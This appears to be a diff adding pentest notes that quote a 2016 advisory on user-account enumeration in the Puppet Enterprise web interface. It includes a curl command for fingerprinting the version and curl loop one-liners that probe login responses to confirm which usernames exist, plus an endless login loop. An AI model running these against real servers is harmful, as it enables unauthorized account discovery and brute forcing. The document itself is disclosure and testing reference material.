@@ -1,0 +1,38 @@
+* Get version via install script (port may differ)
+
+	curl -sk https://<host>:8140/packages/current/install.bash | grep 'Puppet'
+	...
+	fail "$(uname -s) is not a supported platform for Puppet Enterprise v3.8.0
+
+------------------------------------------------------------------------------------------
+
+Puppet Enterprise Web Interface User Enumeration
+https://seclists.org/bugtraq/2016/Oct/48
+
+Vendor Acknowledgement: August 23, 2016
+Vendor Releases Version: 2016.4.0
+October 17, 2016  : Public Disclosure
+
+Details:
+=====================
+
+	By sending remote HTTP request to Puppet Enterprise Web Interface it is possible to enumerate valid user account names by sending
+	more than 10 requests. If user does not exist we will continue to get  'Authentication failed.' HTTP response from the victim server.
+	However, if the user does exist we will no longer receive such a message confirming the user exists.
+PoC:
+================
+* Verified/Tested on v3.8.0:
+
+Send login request 11 times, after 10 we will know if user exists or not.
+
+FOR /l %i in (1,1,11) DO curl -k  https://victim-puppet-server/auth/login?redirect=Enum-Users  -d username=IDONTEXIST -d password=1
+HTTP 200 OK
+'Authentication failed.'
+
+FOR /l %i in (1,1,11) DO curl -k  https://victim-puppet-server/auth/login?redirect=Enum-Users -d username=BOZO -d password=1
+HTTP 200 OK
+
+----
+
+while [ 1 ]; do  curl -k  https://<host>/auth/login?redirect=bla -d username=<username> -d password=1; done
+
